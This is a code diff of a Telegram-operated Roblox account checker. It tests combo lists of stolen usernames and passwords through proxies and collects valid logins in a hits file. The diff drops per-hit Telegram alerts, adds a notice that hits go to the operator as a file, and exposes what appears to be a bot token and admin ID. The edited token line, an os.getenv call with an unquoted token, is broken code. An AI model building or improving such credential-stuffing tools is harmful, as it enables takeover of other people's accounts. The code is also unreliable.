@@ -15,7 +15,7 @@ from datetime import datetime
 # ─────────────────────────────────────────────
 #  KONFİGÜRASYON
 # ─────────────────────────────────────────────
-BOT_TOKEN = "8879666700:AAGfBfwt7SnvFPusfW82cnBaKu2JwhZG68Y"
+BOT_TOKEN = os.getenv(8879666700:AAGfBfwt7SnvFPusfW82cnBaKu2JwhZG68Y)
 ADMIN_ID  = 7969180514
 
 HITS_FILE   = "Roblox-Hits.txt"
@@ -510,14 +510,7 @@ def worker(combo_queue, proxies_list):
             if status == "HIT":
                 with _lock:
                     _st_hits += 1
-                    hit_no = _st_hits
                 append_file(HITS_FILE, line)
-                try:
-                    bot.send_message(_chat_id,
-                        f"⚡ <b>HIT #{hit_no}</b>\n\n<code>{line}</code>",
-                        parse_mode='HTML')
-                except:
-                    pass
 
             elif status == "CUSTOM":
                 with _lock:
@@ -615,7 +608,8 @@ def cmd_start(message):
         "⚙️ <b>Akış:</b>\n"
         "1. /proxy ile proxy yükle (opsiyonel)\n"
         "2. /check ile combo dosyası yükle\n"
-        "3. Bot otomatik başlar"
+        "3. Bot otomatik başlar\n\n"
+        "📢 Hit'ler tarama bitince dosya olarak gönderilir."
     )
     bot.send_message(message.chat.id, text, parse_mode='HTML')
 
